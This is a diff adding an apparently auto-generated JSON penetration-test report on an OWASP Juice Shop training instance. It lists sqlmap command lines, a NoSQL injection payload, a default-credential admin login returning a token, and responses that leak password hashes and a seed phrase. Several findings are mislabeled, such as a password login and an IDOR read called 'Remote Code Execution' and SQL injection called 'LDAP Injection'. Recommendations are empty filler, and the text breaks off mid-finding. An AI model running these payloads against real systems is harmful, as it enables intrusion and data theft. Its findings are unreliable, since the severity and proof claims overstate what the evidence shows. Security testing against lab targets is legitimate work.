@@ -1,0 +1,487 @@
+{
+  "engagement_id": "b04867bf-5219-43d0-9a92-8102e98a61c6",
+  "target_url": "http://juice-shop:3000/",
+  "generated_at": "2026-09-03T22:04:32.914524",
+  "executive_summary": {
+    "risk_score": 9.5,
+    "narrative": "61 hypotheses tested, 13 proven and reported. Unproven candidates are in the raw artifacts, not shown as findings.\n\nAutomated summary: the findings below were proven exploitable during the test.",
+    "counts_by_severity": {
+      "critical": 4,
+      "high": 5,
+      "medium": 4
+    },
+    "confirmed_count": 13,
+    "total_findings": 13
+  },
+  "findings": [
+    {
+      "id": "W-020",
+      "title": "NoSQL Injection",
+      "asset": "/rest/products/search",
+      "severity": "critical",
+      "cvss_score": 9.5,
+      "cvss_vector": "",
+      "confirmed": true,
+      "status": "confirmed exploitable (1 proof(s))",
+      "technique_ids": [
+        "T1190"
+      ],
+      "owasp_category": "",
+      "recommendation": "Confirmed via 1 attempt(s).",
+      "effort": "medium",
+      "evidence": [
+        {
+          "request": "http_request {\"url\": \"http://juice-shop:3000/rest/products/search?q[$regex]=\", \"method\": \"GET\", \"headers\": {\"accept\": \"application/json, text/plain, */*\", \"referer\": \"http://juice-shop:3000/\", \"user-agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36\"}}",
+          "response": "{\"url\": \"http://juice-shop:3000/rest/products/search?q[$regex]=\", \"status_code\": 500, \"headers\": {\"access-control-allow-origin\": \"*\", \"x-content-type-options\": \"nosniff\", \"x-frame-options\": \"SAMEORIGIN\", \"feature-policy\": \"payment 'self'\", \"x-recruiting\": \"/#/jobs\", \"content-type\": \"application/json; charset=utf-8\", \"vary\": \"Accept-Encoding\", \"content-encoding\": \"gzip\", \"date\": \"Thu, 03 Sep 2026 22:00:06 GMT\", \"connection\": \"keep-alive\", \"keep-alive\": \"timeout=5\", \"transfer-encoding\": \"chunked\"}, \"body\": \"{\\n  \\\"error\\\": {\\n    \\\"message\\\": \\\"criteria.substring is not a function\\\",\\n    \\\"stack\\\": \\\"TypeError: criteria.substring is not a function\\\\n    at /juice-shop/build/routes/search.js:41:67\\\\n    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)\\\\n    at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)\\\\n    at Route.dispatch (/juice-shop/node_modules/express/lib/router/route.js:119:3)\\\\n    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)\\\\n    at /juice-shop/node_modules/express/lib/router/index.js:284:15\\\\n    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)\\\\n    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)\\\\n    at /juice-shop/build/routes/verify.js:171:5\\\\n    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)\\\\n    at trim_prefix (/juice-shop/node",
+          "note": "VERDICT: PROVEN \u2014 The error \"criteria.substring is not a function\" when injecting NoSQL operators like `$ne` and `$regex` indicates the application incorrectly handles the query parameter as a string ",
+          "captured_at": "2026-09-03T22:00:07.740988"
+        }
+      ]
+    },
+    {
+      "id": "W-038",
+      "title": "SQL Injection",
+      "asset": "/rest/user/login",
+      "severity": "critical",
+      "cvss_score": 9.5,
+      "cvss_vector": "",
+      "confirmed": true,
+      "status": "confirmed exploitable (1 proof(s))",
+      "technique_ids": [
+        "T1190"
+      ],
+      "owasp_category": "",
+      "recommendation": "Confirmed via 1 attempt(s).",
+      "effort": "medium",
+      "evidence": [
+        {
+          "request": "sqlmap {\"url\": \"http://juice-shop:3000/rest/user/login\", \"method\": \"POST\", \"data\": {\"email\": \"test@example.com\", \"password\": \"Test1234!\"}, \"param\": \"email\", \"level\": 1, \"risk\": 1, \"extra_flags\": [\"--ignore-code=401\"]}",
+          "response": "{\"command\": \"python3 /opt/sqlmap/sqlmap.py -u http://juice-shop:3000/rest/user/login --batch --disable-coloring --output-dir /tmp/sqlmap-out --level 1 --risk 1 --method POST --data {\\\"email\\\": \\\"test@example.com\\\", \\\"password\\\": \\\"Test1234!\\\"} -p email --ignore-code=401\", \"exit_code\": 0, \"injectable\": true, \"guidance\": \"Injection confirmed \\u2014 conclude PROVEN.\", \"hints\": [\"CONFIRMED injectable. Stop testing this parameter and report VERDICT: PROVEN. To gather proof detail you may re-run with the 'enumerate' argument (e.g. 'current-db', 'banner').\"], \"output_tail\": \"        ___\\n       __H__\\n ___ ___[)]_____ ___ ___  {1.10.8.55#dev}\\n|_ -| . [']     | .'| . |\\n|___|_  [,]_|_|_|__,|  _|\\n      |_|V...       |_|   https://sqlmap.org\\n\\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\\n\\n[*] starting @ 22:02:25 /2026-09-03/\\n\\n\\r[22:02:25] [WARNING] using '/tmp/sqlmap-out' as the output directory\\n\\r[22:02:25] [WARNING] unable to create history directory '/home/apts/.local/share/sqlmap/history' ([Errno 13] Permission denied: '/home/apts'). Using temporary directory '/tmp/sqlmaphistory7e8hrgtp' instead\\nJSON data found in POST body. Do you want to process it? [Y/n/q] Y\\n\\r[22:02:25] [INFO] resuming back-end DBMS 'sqlite' \\n\\r[22:02:25] ",
+          "note": "VERDICT: PROVEN \u2014 SQL injection vulnerability confirmed in the `email` parameter of the POST request to `/rest/user/login`.",
+          "captured_at": "2026-09-03T22:02:26.334396"
+        }
+      ]
+    },
+    {
+      "id": "W-045",
+      "title": "Remote Code Execution",
+      "asset": "/rest/user/login",
+      "severity": "critical",
+      "cvss_score": 9.5,
+      "cvss_vector": "",
+      "confirmed": true,
+      "status": "confirmed exploitable (1 proof(s))",
+      "technique_ids": [
+        "T1110.001"
+      ],
+      "owasp_category": "",
+      "recommendation": "Confirmed via 1 attempt(s).",
+      "effort": "medium",
+      "evidence": [
+        {
+          "request": "http_request {\"url\": \"http://juice-shop:3000/rest/user/login\", \"method\": \"POST\", \"headers\": {\"accept\": \"application/json, text/plain, */*\", \"cookie\": \"language=en; continueCode=jnvRwgZRND7neOL142Yq58Mvoadx5fph7mGxV6pWE9j3lBmQrXbPKyJzklez; welcomebanner_status=dismiss\", \"origin\": \"http://juice-shop:3000\", \"referer\": \"http://juice-shop:3000/\", \"user-agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36\", \"content-type\": \"application/json\"}, \"body\": {\"email\": \"admin@juice-sh.op\", \"password\": \"admin123\"}}",
+          "response": "{\"url\": \"http://juice-shop:3000/rest/user/login\", \"status_code\": 200, \"headers\": {\"access-control-allow-origin\": \"*\", \"x-content-type-options\": \"nosniff\", \"x-frame-options\": \"SAMEORIGIN\", \"feature-policy\": \"payment 'self'\", \"x-recruiting\": \"/#/jobs\", \"content-type\": \"application/json; charset=utf-8\", \"content-length\": \"799\", \"etag\": \"W/\\\"31f-vPopZjzGfi5LB5IdErCldyHhXMU\\\"\", \"vary\": \"Accept-Encoding\", \"date\": \"Thu, 03 Sep 2026 22:03:05 GMT\", \"connection\": \"keep-alive\", \"keep-alive\": \"timeout=5\"}, \"body\": \"{\\\"authentication\\\":{\\\"token\\\":\\\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDktMDMgMjI6MDE6MjEuNDkwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDktMDMgMjI6MDE6MjEuNDkwICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc4ODQ3Mjk4NX0.bavSRW2ctbc2m_mMX9Olp9lbI8nUxER24S1jZ5CSJ_e-aP9Ch0AgP1xDqXgOZFE2_5b_4TyMq4xZViz3Zgne55wJiRsie6qksIPMSiXCWrbl9gN5OCcNVJ7ChbnDdYOT62DkR5mu6rPT9f-VRYHir1CkQZqT8GeHi_v_koBeygw\\\",\\\"bid\\\":1,\\\"umail\\\":\\\"admin@juice-sh.op\\\"}}\", \"truncated\": false, \"redirect_to\": null}",
+          "note": "VERDICT: PROVEN \u2014 Successful login with username admin@juice-sh.op and password admin123 returned a valid authentication token.",
+          "captured_at": "2026-09-03T22:03:05.833489"
+        }
+      ]
+    },
+    {
+      "id": "W-056",
+      "title": "Remote Code Execution",
+      "asset": "/rest/memories/",
+      "severity": "critical",
+      "cvss_score": 9.5,
+      "cvss_vector": "",
+      "confirmed": true,
+      "status": "confirmed exploitable (1 proof(s))",
+      "technique_ids": [
+        "T1190"
+      ],
+      "owasp_category": "",
+      "recommendation": "Confirmed via 1 attempt(s).",
+      "effort": "medium",
+      "evidence": [
+        {
+          "request": "http_request {\"url\": \"http://juice-shop:3000/rest/memories/\", \"method\": \"GET\", \"headers\": {\"accept\": \"application/json, text/plain, */*\", \"referer\": \"http://juice-shop:3000/\", \"user-agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36\"}}",
+          "response": "{\"url\": \"http://juice-shop:3000/rest/memories/\", \"status_code\": 200, \"headers\": {\"access-control-allow-origin\": \"*\", \"x-content-type-options\": \"nosniff\", \"x-frame-options\": \"SAMEORIGIN\", \"feature-policy\": \"payment 'self'\", \"x-recruiting\": \"/#/jobs\", \"content-type\": \"application/json; charset=utf-8\", \"etag\": \"W/\\\"1822-ab8aKUqu/jO40buBHoaqkVtrBUg\\\"\", \"vary\": \"Accept-Encoding\", \"content-encoding\": \"gzip\", \"date\": \"Thu, 03 Sep 2026 22:04:02 GMT\", \"connection\": \"keep-alive\", \"keep-alive\": \"timeout=5\", \"transfer-encoding\": \"chunked\"}, \"body\": \"{\\\"status\\\":\\\"success\\\",\\\"data\\\":[{\\\"UserId\\\":13,\\\"id\\\":1,\\\"caption\\\":\\\"\\ud83d\\ude3c #zatschi #whoneedsfourlegs\\\",\\\"imagePath\\\":\\\"assets/public/images/uploads/\\ud83d\\ude3c-#zatschi-#whoneedsfourlegs-1572600969477.jpg\\\",\\\"createdAt\\\":\\\"2026-09-03T22:01:22.986Z\\\",\\\"updatedAt\\\":\\\"2026-09-03T22:01:22.986Z\\\",\\\"User\\\":{\\\"id\\\":13,\\\"username\\\":\\\"\\\",\\\"email\\\":\\\"bjoern@owasp.org\\\",\\\"password\\\":\\\"9283f1b2e9669749081963be0462e466\\\",\\\"role\\\":\\\"deluxe\\\",\\\"deluxeToken\\\":\\\"efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4\\\",\\\"lastLoginIp\\\":\\\"\\\",\\\"profileImage\\\":\\\"assets/public/images/uploads/13.jpg\\\",\\\"totpSecret\\\":\\\"\\\",\\\"isActive\\\":true,\\\"createdAt\\\":\\\"2026-09-03T22:01:21.492Z\\\",\\\"updatedAt\\\":\\\"2026-09-03T22:01:21.492Z\\\",\\\"deletedAt\\\":null}},{\\\"UserId\\\":4,\\\"id\\\":2,\\\"caption\\\":\\\"Magn(et)ificent!\\\",\\\"imagePath\\\":\\\"assets/public/images/uploads/magn(et)ificent!-1571814229653.jpg\\\",\\\"createdAt\\\":\\\"2026-09-03T22:01:22.986Z\\\",\\\"updatedAt\\\":\\\"2026-09",
+          "note": "VERDICT: PROVEN \u2014 Accessing `/rest/memories/` without authentication returns sensitive data about users' memories, confirming IDOR vulnerability.",
+          "captured_at": "2026-09-03T22:04:02.689793"
+        }
+      ]
+    },
+    {
+      "id": "W-002",
+      "title": "IDOR (Broken Access Control)",
+      "asset": "/rest/admin/application-configuration",
+      "severity": "high",
+      "cvss_score": 7.5,
+      "cvss_vector": "",
+      "confirmed": true,
+      "status": "confirmed exploitable (1 proof(s))",
+      "technique_ids": [
+        "T1213"
+      ],
+      "owasp_category": "",
+      "recommendation": "Confirmed via 1 attempt(s).",
+      "effort": "medium",
+      "evidence": [
+        {
+          "request": "http_request {\"url\": \"http://juice-shop:3000/rest/admin/application-configuration\", \"method\": \"GET\"}",
+          "response": "{\"url\": \"http://juice-shop:3000/rest/admin/application-configuration\", \"status_code\": 200, \"headers\": {\"access-control-allow-origin\": \"*\", \"x-content-type-options\": \"nosniff\", \"x-frame-options\": \"SAMEORIGIN\", \"feature-policy\": \"payment 'self'\", \"x-recruiting\": \"/#/jobs\", \"content-type\": \"application/json; charset=utf-8\", \"etag\": \"W/\\\"5420-k5bPYNVGxIX71pMlQn1RBM3Rthg\\\"\", \"vary\": \"Accept-Encoding\", \"content-encoding\": \"gzip\", \"date\": \"Thu, 03 Sep 2026 21:59:12 GMT\", \"connection\": \"keep-alive\", \"keep-alive\": \"timeout=5\", \"transfer-encoding\": \"chunked\"}, \"body\": \"{\\\"config\\\":{\\\"server\\\":{\\\"port\\\":3000,\\\"basePath\\\":\\\"\\\",\\\"baseUrl\\\":\\\"http://localhost:3000\\\"},\\\"application\\\":{\\\"domain\\\":\\\"juice-sh.op\\\",\\\"name\\\":\\\"OWASP Juice Shop\\\",\\\"logo\\\":\\\"JuiceShop_Logo.png\\\",\\\"favicon\\\":\\\"favicon_js.ico\\\",\\\"theme\\\":\\\"bluegrey-lightgreen\\\",\\\"showVersionNumber\\\":true,\\\"showGitHubLinks\\\":true,\\\"localBackupEnabled\\\":true,\\\"numberOfRandomFakeUsers\\\":0,\\\"altcoinName\\\":\\\"Juicycoin\\\",\\\"privacyContactEmail\\\":\\\"donotreply@owasp-juice.shop\\\",\\\"customMetricsPrefix\\\":\\\"juiceshop\\\",\\\"chatBot\\\":{\\\"name\\\":\\\"Juicy\\\",\\\"greeting\\\":\\\"Nice to meet you <customer-name>, I'm <bot-name>\\\",\\\"trainingData\\\":\\\"botDefaultTrainingData.json\\\",\\\"defaultResponse\\\":\\\"Sorry I couldn't understand what you were trying to say\\\",\\\"avatar\\\":\\\"JuicyChatBot.png\\\"},\\\"social\\\":{\\\"twitterUrl\\\":\\\"https://twitter.com/owasp_juiceshop\\\",\\\"facebookUrl\\\":\\\"https://www.facebook.com/owasp.juiceshop\\\",\\\"slackUrl\\\":\\\"https://owasp.org/slack/invite",
+          "note": "VERDICT: PROVEN \u2014 The endpoint /rest/admin/application-configuration is accessible without authentication and exposes sensitive application configuration data.",
+          "captured_at": "2026-09-03T21:59:13.387815"
+        }
+      ]
+    },
+    {
+      "id": "W-010",
+      "title": "Broken Access Control",
+      "asset": "/rest/admin/application-version",
+      "severity": "high",
+      "cvss_score": 7.5,
+      "cvss_vector": "",
+      "confirmed": true,
+      "status": "confirmed exploitable (1 proof(s))",
+      "technique_ids": [
+        "T1548"
+      ],
+      "owasp_category": "",
+      "recommendation": "Confirmed via 1 attempt(s).",
+      "effort": "medium",
+      "evidence": [
+        {
+          "request": "http_request {\"url\": \"http://juice-shop:3000/rest/admin/application-version\", \"method\": \"GET\", \"headers\": {\"accept\": \"application/json, text/plain, */*\", \"referer\": \"http://juice-shop:3000/\", \"user-agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36\"}}",
+          "response": "{\"url\": \"http://juice-shop:3000/rest/admin/application-version\", \"status_code\": 200, \"headers\": {\"access-control-allow-origin\": \"*\", \"x-content-type-options\": \"nosniff\", \"x-frame-options\": \"SAMEORIGIN\", \"feature-policy\": \"payment 'self'\", \"x-recruiting\": \"/#/jobs\", \"content-type\": \"application/json; charset=utf-8\", \"content-length\": \"20\", \"etag\": \"W/\\\"14-10h2liq3tMxzTFCiH84ZpDMBuNc\\\"\", \"vary\": \"Accept-Encoding\", \"date\": \"Thu, 03 Sep 2026 21:59:32 GMT\", \"connection\": \"keep-alive\", \"keep-alive\": \"timeout=5\"}, \"body\": \"{\\\"version\\\":\\\"17.1.1\\\"}\", \"truncated\": false, \"redirect_to\": null}",
+          "note": "VERDICT: PROVEN \u2014 The admin endpoint /rest/admin/application-version is accessible without authentication, returning application version details.",
+          "captured_at": "2026-09-03T21:59:33.394804"
+        }
+      ]
+    },
+    {
+      "id": "W-044",
+      "title": "LDAP Injection",
+      "asset": "/rest/user/login",
+      "severity": "high",
+      "cvss_score": 7.5,
+      "cvss_vector": "",
+      "confirmed": true,
+      "status": "confirmed exploitable (1 proof(s))",
+      "technique_ids": [
+        "T1190"
+      ],
+      "owasp_category": "",
+      "recommendation": "Confirmed via 1 attempt(s).",
+      "effort": "medium",
+      "evidence": [
+        {
+          "request": "sqlmap {\"url\": \"http://juice-shop:3000/rest/user/login\", \"method\": \"POST\", \"data\": {\"email\": \"test@example.com\", \"password\": \"Test1234!\"}, \"param\": \"email\", \"level\": 3, \"risk\": 2, \"extra_flags\": [\"--ignore-code=401\", \"--random-agent\"]}",
+          "response": "{\"command\": \"python3 /opt/sqlmap/sqlmap.py -u http://juice-shop:3000/rest/user/login --batch --disable-coloring --output-dir /tmp/sqlmap-out --level 3 --risk 2 --method POST --data {\\\"email\\\": \\\"test@example.com\\\", \\\"password\\\": \\\"Test1234!\\\"} -p email --ignore-code=401 --random-agent\", \"exit_code\": 0, \"injectable\": true, \"guidance\": \"Injection confirmed \\u2014 conclude PROVEN.\", \"hints\": [\"CONFIRMED injectable. Stop testing this parameter and report VERDICT: PROVEN. To gather proof detail you may re-run with the 'enumerate' argument (e.g. 'current-db', 'banner').\"], \"output_tail\": \"        ___\\n       __H__\\n ___ ___[(]_____ ___ ___  {1.10.8.55#dev}\\n|_ -| . [\\\"]     | .'| . |\\n|___|_  [\\\"]_|_|_|__,|  _|\\n      |_|V...       |_|   https://sqlmap.org\\n\\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\\n\\n[*] starting @ 22:03:01 /2026-09-03/\\n\\n\\r[22:03:01] [WARNING] using '/tmp/sqlmap-out' as the output directory\\n\\r[22:03:01] [WARNING] unable to create history directory '/home/apts/.local/share/sqlmap/history' ([Errno 13] Permission denied: '/home/apts'). Using temporary directory '/tmp/sqlmaphistoryjbfhhg2d' instead\\n\\r[22:03:01] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit",
+          "note": "VERDICT: PROVEN \u2014 sqlmap confirmed SQL injection in the `email` parameter of the `/rest/user/login` endpoint via a boolean-based blind payload.",
+          "captured_at": "2026-09-03T22:03:01.945276"
+        }
+      ]
+    },
+    {
+      "id": "W-050",
+      "title": "IDOR (Broken Access Control)",
+      "asset": "/api/Feedbacks/",
+      "severity": "high",
+      "cvss_score": 7.5,
+      "cvss_vector": "",
+      "confirmed": true,
+      "status": "confirmed exploitable (1 proof(s))",
+      "technique_ids": [
+        "T1213"
+      ],
+      "owasp_category": "",
+      "recommendation": "Confirmed via 1 attempt(s).",
+      "effort": "medium",
+      "evidence": [
+        {
+          "request": "http_request {\"url\": \"http://juice-shop:3000/api/Feedbacks/?_id=3\", \"method\": \"GET\", \"headers\": {\"accept\": \"application/json, text/plain, */*\", \"cookie\": \"language=en; continueCode=jnvRwgZRND7neOL142Yq58Mvoadx5fph7mGxV6pWE9j3lBmQrXbPKyJzklez; welcomebanner_status=dismiss\", \"referer\": \"http://juice-shop:3000/\", \"user-agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36\"}}",
+          "response": "{\"url\": \"http://juice-shop:3000/api/Feedbacks/?_id=3\", \"status_code\": 200, \"headers\": {\"access-control-allow-origin\": \"*\", \"x-content-type-options\": \"nosniff\", \"x-frame-options\": \"SAMEORIGIN\", \"feature-policy\": \"payment 'self'\", \"x-recruiting\": \"/#/jobs\", \"content-type\": \"application/json; charset=utf-8\", \"etag\": \"W/\\\"6c6-tsiTAd3GWKjlVpViiP7sDPhKH7M\\\"\", \"vary\": \"Accept-Encoding\", \"content-encoding\": \"gzip\", \"date\": \"Thu, 03 Sep 2026 22:03:27 GMT\", \"connection\": \"keep-alive\", \"keep-alive\": \"timeout=5\", \"transfer-encoding\": \"chunked\"}, \"body\": \"{\\\"status\\\":\\\"success\\\",\\\"data\\\":[{\\\"UserId\\\":1,\\\"id\\\":1,\\\"comment\\\":\\\"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\\\",\\\"rating\\\":5,\\\"createdAt\\\":\\\"2026-09-03T22:01:21.612Z\\\",\\\"updatedAt\\\":\\\"2026-09-03T22:01:21.612Z\\\"},{\\\"UserId\\\":2,\\\"id\\\":2,\\\"comment\\\":\\\"Great shop! Awesome service! (***@juice-sh.op)\\\",\\\"rating\\\":4,\\\"createdAt\\\":\\\"2026-09-03T22:01:21.618Z\\\",\\\"updatedAt\\\":\\\"2026-09-03T22:01:21.618Z\\\"},{\\\"UserId\\\":3,\\\"id\\\":3,\\\"comment\\\":\\\"Nothing useful available here! (***der@juice-sh.op)\\\",\\\"rating\\\":1,\\\"createdAt\\\":\\\"2026-09-03T22:01:21.623Z\\\",\\\"updatedAt\\\":\\\"2026-09-03T22:01:21.623Z\\\"},{\\\"UserId\\\":21,\\\"id\\\":4,\\\"comment\\\":\\\"Please send me the juicy chatbot NFT in my wallet at /juicy-nft : \\\\\\\"purpose betray marriage blame crunch monitor spin slide donate sport lift clutch\\\\\\\" (***ereum@juice-sh.op)\\\",\\\"rating\\\":1,\\\"createdAt\\\":\\\"2026-09-03T22:01:21.690Z\\\",\\\"updatedAt\\\":\\\"2026-09-03T22:01:21.690Z\\\"},{\\",
+          "note": "VERDICT: PROVEN \u2014 The `_id` parameter in the `/api/Feedbacks/` endpoint allows unauthorized access to feedback records, as changing the `_id` value returns different feedback data.",
+          "captured_at": "2026-09-03T22:03:28.287968"
+        }
+      ]
+    },
+    {
+      "id": "W-059",
+      "title": "IDOR (Broken Access Control)",
+      "asset": "/rest/memories/",
+      "severity": "high",
+      "cvss_score": 7.5,
+      "cvss_vector": "",
+      "confirmed": true,
+      "status": "confirmed exploitable (1 proof(s))",
+      "technique_ids": [
+        "T1190"
+      ],
+      "owasp_category": "",
+      "recommendation": "Confirmed via 1 attempt(s).",
+      "effort": "medium",
+      "evidence": [
+        {
+          "request": "http_request {\"url\": \"http://juice-shop:3000/rest/memories/\", \"method\": \"GET\", \"headers\": {\"accept\": \"application/json, text/plain, */*\", \"cookie\": \"language=en; continueCode=jnvRwgZRND7neOL142Yq58Mvoadx5fph7mGxV6pWE9j3lBmQrXbPKyJzklez; welcomebanner_status=dismiss\", \"referer\": \"http://juice-shop:3000/\", \"user-agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36\"}}",
+          "response": "{\"url\": \"http://juice-shop:3000/rest/memories/\", \"status_code\": 200, \"headers\": {\"access-control-allow-origin\": \"*\", \"x-content-type-options\": \"nosniff\", \"x-frame-options\": \"SAMEORIGIN\", \"feature-policy\": \"payment 'self'\", \"x-recruiting\": \"/#/jobs\", \"content-type\": \"application/json; charset=utf-8\", \"etag\": \"W/\\\"1822-ab8aKUqu/jO40buBHoaqkVtrBUg\\\"\", \"vary\": \"Accept-Encoding\", \"content-encoding\": \"gzip\", \"date\": \"Thu, 03 Sep 2026 22:04:11 GMT\", \"connection\": \"keep-alive\", \"keep-alive\": \"timeout=5\", \"transfer-encoding\": \"chunked\"}, \"body\": \"{\\\"status\\\":\\\"success\\\",\\\"data\\\":[{\\\"UserId\\\":13,\\\"id\\\":1,\\\"caption\\\":\\\"\\ud83d\\ude3c #zatschi #whoneedsfourlegs\\\",\\\"imagePath\\\":\\\"assets/public/images/uploads/\\ud83d\\ude3c-#zatschi-#whoneedsfourlegs-1572600969477.jpg\\\",\\\"createdAt\\\":\\\"2026-09-03T22:01:22.986Z\\\",\\\"updatedAt\\\":\\\"2026-09-03T22:01:22.986Z\\\",\\\"User\\\":{\\\"id\\\":13,\\\"username\\\":\\\"\\\",\\\"email\\\":\\\"bjoern@owasp.org\\\",\\\"password\\\":\\\"9283f1b2e9669749081963be0462e466\\\",\\\"role\\\":\\\"deluxe\\\",\\\"deluxeToken\\\":\\\"efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4\\\",\\\"lastLoginIp\\\":\\\"\\\",\\\"profileImage\\\":\\\"assets/public/images/uploads/13.jpg\\\",\\\"totpSecret\\\":\\\"\\\",\\\"isActive\\\":true,\\\"createdAt\\\":\\\"2026-09-03T22:01:21.492Z\\\",\\\"updatedAt\\\":\\\"2026-09-03T22:01:21.492Z\\\",\\\"deletedAt\\\":null}},{\\\"UserId\\\":4,\\\"id\\\":2,\\\"caption\\\":\\\"Magn(et)ificent!\\\",\\\"imagePath\\\":\\\"assets/public/images/uploads/magn(et)ificent!-1571814229653.jpg\\\",\\\"createdAt\\\":\\\"2026-09-03T22:01:22.986Z\\\",\\\"updatedAt\\\":\\\"2026-09",
+          "note": "The vulnerability assessment for insecure direct object reference (IDOR) on the `/rest/memories/` endpoint indicates that the response returns sensitive data associated with user IDs without proper ac",
+          "captured_at": "2026-09-03T22:04:12.151980"
+        }
+      ]
+    },
+    {
+      "id": "W-005",
+      "title": "Information Disclosure",
+      "asset": "/rest/admin/application-configuration",
+      "severity": "medium",
+      "cvss_score": 5.0,
+      "cvss_vector": "",
+      "confirmed": true,
+      "status": "confirmed exploitable (1 proof(s))",
+      "technique_ids": [
+        "T1592"
+      ],
+      "owasp_category": "",
+      "recommendation": "Confirmed via 1 attempt(s).",
+      "effort": "medium",
+      "evidence": [
+        {
+          "request": "http_request {\"url\": \"http://juice-shop:3000/rest/admin/application-configuration\", \"method\": \"GET\", \"headers\": {\"accept\": \"application/json, text/plain, */*\", \"referer\": \"http://juice-shop:3000/\", \"user-agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36\"}}",
+          "response": "{\"url\": \"http://juice-shop:3000/rest/admin/application-configuration\", \"status_code\": 200, \"headers\": {\"access-control-allow-origin\": \"*\", \"x-content-type-options\": \"nosniff\", \"x-frame-options\": \"SAMEORIGIN\", \"feature-policy\": \"payment 'self'\", \"x-recruiting\": \"/#/jobs\", \"content-type\": \"application/json; charset=utf-8\", \"etag\": \"W/\\\"5420-k5bPYNVGxIX71pMlQn1RBM3Rthg\\\"\", \"vary\": \"Accept-Encoding\", \"content-encoding\": \"gzip\", \"date\": \"Thu, 03 Sep 2026 21:59:18 GMT\", \"connection\": \"keep-alive\", \"keep-alive\": \"timeout=5\", \"transfer-encoding\": \"chunked\"}, \"body\": \"{\\\"config\\\":{\\\"server\\\":{\\\"port\\\":3000,\\\"basePath\\\":\\\"\\\",\\\"baseUrl\\\":\\\"http://localhost:3000\\\"},\\\"application\\\":{\\\"domain\\\":\\\"juice-sh.op\\\",\\\"name\\\":\\\"OWASP Juice Shop\\\",\\\"logo\\\":\\\"JuiceShop_Logo.png\\\",\\\"favicon\\\":\\\"favicon_js.ico\\\",\\\"theme\\\":\\\"bluegrey-lightgreen\\\",\\\"showVersionNumber\\\":true,\\\"showGitHubLinks\\\":true,\\\"localBackupEnabled\\\":true,\\\"numberOfRandomFakeUsers\\\":0,\\\"altcoinName\\\":\\\"Juicycoin\\\",\\\"privacyContactEmail\\\":\\\"donotreply@owasp-juice.shop\\\",\\\"customMetricsPrefix\\\":\\\"juiceshop\\\",\\\"chatBot\\\":{\\\"name\\\":\\\"Juicy\\\",\\\"greeting\\\":\\\"Nice to meet you <customer-name>, I'm <bot-name>\\\",\\\"trainingData\\\":\\\"botDefaultTrainingData.json\\\",\\\"defaultResponse\\\":\\\"Sorry I couldn't understand what you were trying to say\\\",\\\"avatar\\\":\\\"JuicyChatBot.png\\\"},\\\"social\\\":{\\\"twitterUrl\\\":\\\"https://twitter.com/owasp_juiceshop\\\",\\\"facebookUrl\\\":\\\"https://www.facebook.com/owasp.juiceshop\\\",\\\"slackUrl\\\":\\\"https://owasp.org/slack/invite",
+          "note": "VERDICT: PROVEN \u2014 The endpoint /rest/admin/application-configuration returns verbose application configuration details including server port, base URL, domain, and other internal settings when accesse",
+          "captured_at": "2026-09-03T21:59:19.351988"
+        }
+      ]
+    },
+    {
+      "id": "W-009",
+      "title": "Information Disclosure",
+      "asset": "/rest/admin/application-version",
+      "severity": "medium",
+      "cvss_score": 5.0,
+      "cvss_vector": "",
+      "confirmed": true,
+      "status": "confirmed exploitable (1 proof(s))",
+      "technique_ids": [
+        "T1592"
+      ],
+      "owasp_category": "",
+      "recommendation": "Confirmed via 1 attempt(s).",
+      "effort": "medium",
+      "evidence": [
+        {
